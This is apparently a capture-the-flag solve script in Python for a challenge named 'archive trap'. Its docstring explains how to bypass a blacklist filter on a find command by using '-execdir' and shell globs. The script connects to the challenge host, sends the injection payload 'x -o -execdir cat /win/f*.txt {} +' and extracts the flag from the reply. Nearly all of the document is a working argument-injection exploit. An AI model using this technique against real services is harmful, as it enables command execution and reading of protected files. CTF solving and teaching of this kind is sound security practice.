#!/usr/bin/env python3
"""archive trap -- two filters, two independent holes.

chal.c builds:      /bin/sh ./filter.sh ./box -maxdepth 1 -name <INPUT> -print
and rejects INPUT containing  ; | & ` $ ( ) < > \n \r  "flag" "sh" "bash".

filter.sh then rejects an argument that is *exactly* "-exec":

    case "$arg" in
        -exec) ... exit 1 ;;
    esac
    exec find "$@"

Hole 1: the case arm matches "-exec" only, so **-execdir sails through** and
        gives us command execution with find's own arguments.
Hole 2: "flag" is banned as a substring, but the whole command string goes to
        system() -> /bin/sh -c, so a glob /win/f*.txt is expanded by the shell
        before find (or the filter) ever sees the word "flag".

-execdir requires a {} before the + terminator, and ";" is banned, so we pass
both the real target and {}:   -execdir cat /win/f*.txt {} +
"""
import os
import re
import socket
import sys

HOST = os.environ.get("TRAP_HOST", "chal.secso.cc")
PORT = int(os.environ.get("TRAP_PORT", "3000"))
PAYLOAD = b"x -o -execdir cat /win/f*.txt {} +"

s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(8)


def read(tok=b"pattern: "):
    buf = b""
    try:
        while tok not in buf:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    return buf


print(read().decode(errors="replace"), end="")
print(f"[*] payload: {PAYLOAD.decode()}")
s.sendall(PAYLOAD + b"\n")

out = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        out += chunk
except socket.timeout:
    pass

print(out.decode(errors="replace"))
m = re.search(rb"(K17\{[^}]*\}|SCONES\{[^}]*\})", out)
if m:
    print("[+] FLAG:", m.group(1).decode())
else:
    sys.exit("[-] no flag")
